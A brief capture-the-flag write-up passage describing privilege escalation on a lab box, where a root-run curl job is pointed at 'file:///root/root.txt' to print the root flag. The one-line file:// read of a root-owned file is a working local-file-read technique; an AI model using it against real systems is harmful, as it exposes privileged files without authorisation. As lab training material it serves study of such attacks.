# Escalation

In `/home/floris/admin-area`, we can find 2 files. First seems to be an url and the `report` seems to be the result of the curl command.
Let's try a `LFI` to read root flag on the box.

```bash
$ cat input 
url = "file:///root/root.txt"
$ cat report 
82c198ab6fc5365fdc6da2ee5c26064a
```

We get the flag !